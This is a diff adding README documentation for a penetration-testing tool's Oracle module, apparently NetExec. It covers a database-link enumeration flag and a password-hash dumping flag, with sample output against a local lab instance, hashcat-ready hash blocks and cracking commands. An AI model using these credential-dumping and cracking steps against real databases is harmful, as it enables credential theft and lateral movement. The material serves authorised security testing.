@@ -281,6 +281,88 @@ ORACLE  127.0.0.1  1521  127.0.0.1    USERS
 ORACLE  127.0.0.1  1521  127.0.0.1  [*] Note: use a DBA account to see status and sizes
 ```
 
+### Database Links (`--dblinks`)
+
+Enumerates database links — often the quickest path to lateral movement, since a link's
+configured remote username is visible via `DBA_DB_LINKS`/`ALL_DB_LINKS`. **Oracle never
+exposes the stored password via SQL, even to SYSDBA**, so only the username and target are
+shown.
+
+```
+$ nxc oracle 127.0.0.1 -u system -p OraclePw123 --service-name XEPDB1 --dblinks
+ORACLE  127.0.0.1  1521  127.0.0.1  [+] system:OraclePw123 (version:21.3.0.0.0) (Pwn3d!)
+ORACLE  127.0.0.1  1521  127.0.0.1  [+] Database links (1):
+ORACLE  127.0.0.1  1521  127.0.0.1    SYSTEM.FINANCE_LINK
+ORACLE  127.0.0.1  1521  127.0.0.1      Remote user: FINANCE_SVC
+ORACLE  127.0.0.1  1521  127.0.0.1      Target:      (DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST=10.0.0.50)(PORT=1521))(CONNECT_DATA=(SERVICE_NAME=FINANCEDB)))
+```
+
+Non-DBA users fall back to `all_db_links`, which shows only links they own or that are public.
+
+### Password Hash Dumping (`--dump-hashes`)
+
+Dumps password verifiers from `sys.user$` for offline cracking with hashcat/john. **Requires
+`--sysdba`** — the DBA role alone cannot read this SYS-owned base table.
+
+Oracle stores up to three verifier types depending on version/config:
+
+| Verifier | Source | hashcat mode |
+|---|---|---|
+| Legacy DES hash | `PASSWORD` column (pre-11g compatibility) | `-m 3100` |
+| 11g SHA-1 | `SPARE4` `S:` segment | `-m 112` |
+| 12c+ SHA-512/PBKDF2 | `SPARE4` `T:` segment | `-m 12300` |
+
+Roles (e.g. `CONNECT`, `DBA`) are filtered out automatically, and accounts using external or
+global authentication are reported separately rather than presented as fake crackable hashes
+(Oracle writes a literal `EXTERNAL`/`GLOBAL` marker for these, not a hash). Each account is
+tagged with its `OPEN`/`LOCKED` status so you can prioritize.
+
+```
+$ nxc oracle 127.0.0.1 -u sys -p OraclePw123 --service-name XE --sysdba --dump-hashes
+ORACLE  127.0.0.1  1521  127.0.0.1  [+] sys:OraclePw123 (version:21.3.0.0.0) (SYSDBA) (Pwn3d!)
+ORACLE  127.0.0.1  1521  127.0.0.1  [+] Password hashes for 27 account(s):
+ORACLE  127.0.0.1  1521  127.0.0.1    ANONYMOUS [LOCKED]
+ORACLE  127.0.0.1  1521  127.0.0.1      [SHA1/11g, hashcat -m 112] 0000000000000000000000000000000000000000B07826CCABAFED19D301
+ORACLE  127.0.0.1  1521  127.0.0.1      [SHA512/12c+, hashcat -m 12300] 0000...DDE90E506D9DE54BDF35B445A4AFF6AB
+ORACLE  127.0.0.1  1521  127.0.0.1    SYS [OPEN]
+ORACLE  127.0.0.1  1521  127.0.0.1      [SHA1/11g, hashcat -m 112] 3AA50D1E3A76D480B13139B5B7DEA428948E76AFF48474C9A27889094975
+ORACLE  127.0.0.1  1521  127.0.0.1      [SHA512/12c+, hashcat -m 12300] F7E2B1381E2DE103067BFC492952832774409AFD1725FA8FBD2C29C14720D3D87CD958C38B959B37C9F1F0C87BA11A08F0454A5B43AEAB66A2C408795746D2AF5EBD5E17A343C1E12628D3D0E6E61257
+ORACLE  127.0.0.1  1521  127.0.0.1    SYSTEM [OPEN]
+ORACLE  127.0.0.1  1521  127.0.0.1      [SHA1/11g, hashcat -m 112] 87E15FA13D5FDCBB293DFC9B878EB8400DD68F5E5195A7EFC5B4DB1FEB1F
+ORACLE  127.0.0.1  1521  127.0.0.1      [SHA512/12c+, hashcat -m 12300] 5D0FA231B7EEB0EFB29C6F56F0DEE371951D88BA43780768772894012C98474DF9899CBB343C3272FFBBC5F242F7E4CF7DAED8F189CABD2C0C3052ECF4F08CA8D36C843D9D1F638337E674BAB099158A
+ORACLE  127.0.0.1  1521  127.0.0.1  [*] Lines below are ready to save as hashcat input files, one per mode:
+ORACLE  127.0.0.1  1521  127.0.0.1    -- hashcat -m 112 --
+ORACLE  127.0.0.1  1521  127.0.0.1    ANONYMOUS:0000000000000000000000000000000000000000B07826CCABAFED19D301
+ORACLE  127.0.0.1  1521  127.0.0.1    SYS:3AA50D1E3A76D480B13139B5B7DEA428948E76AFF48474C9A27889094975
+ORACLE  127.0.0.1  1521  127.0.0.1    ...
+ORACLE  127.0.0.1  1521  127.0.0.1    -- hashcat -m 12300 --
+ORACLE  127.0.0.1  1521  127.0.0.1    SYS:F7E2B1381E2DE103067BFC492952832774409AFD1725FA8FBD2C29C14720D3D87CD958C38B959B37C9F1F0C87BA11A08F0454A5B43AEAB66A2C408795746D2AF5EBD5E17A343C1E12628D3D0E6E61257
+ORACLE  127.0.0.1  1521  127.0.0.1    ...
+ORACLE  127.0.0.1  1521  127.0.0.1  [*] 1 account(s) use external/global authentication (no local hash):
+ORACLE  127.0.0.1  1521  127.0.0.1    OPS$ORACLE [OPEN] (EXTERNAL)
+```
+
+Save each `-- hashcat -m N --` block to its own `.hash` file and crack with:
+
+```bash
+hashcat -m 112 -a 0 oracle_m112.hash wordlist.txt
+hashcat -m 12300 -a 0 oracle_m12300.hash wordlist.txt
+```
+
+> **Note:** values are extracted exactly as Oracle stores them. hashcat/john input format
+> conventions can shift between versions — verify against your tool's current docs for each
+> mode before a long crack run. Locked internal accounts (`ANONYMOUS`, `APPQOSSYS`, etc.) ship
+> with Oracle-templated verifiers that are typically not worth cracking; focus on accounts
+> marked `[OPEN]`.
+
+Without `--sysdba`, this fails with a clear hint:
+
+```
+$ nxc oracle 127.0.0.1 -u system -p OraclePw123 --service-name XE --dump-hashes
+ORACLE  127.0.0.1  1521  127.0.0.1  [+] system:OraclePw123 (version:21.3.0.0.0) (Pwn3d!)
+ORACLE  127.0.0.1  1521  127.0.0.1  [-] Cannot read sys.user$: ORA-01031: insufficient privileges — this typically requires --sysdba
+```
+
 ### Arbitrary SQL Query (`-q`)
 
 Execute any SQL statement and get tabular output:
@@ -307,7 +389,7 @@ ORACLE  127.0.0.1  1521  127.0.0.1  [-] Query error: ORA-00942: table or view do
 All enumeration flags can be used together in a single command:
 
 ```bash
-nxc oracle 10.10.10.5 -u system -p OraclePw123 --service-name XE --users --roles --tablespaces --database
+nxc oracle 10.10.10.5 -u system -p OraclePw123 --service-name XE --users --roles --tablespaces --database --dblinks
 ```
 
 ---
@@ -324,6 +406,8 @@ Enumeration:
   --users               Enumerate database users/accounts
   --roles               Show current session roles and system privileges
   --tablespaces         List tablespaces
+  --dblinks             Enumerate database links
+  --dump-hashes         Dump password hashes from sys.user$ (requires --sysdba)
   -q QUERY              Execute the specified SQL query
 
 Connection Privilege:
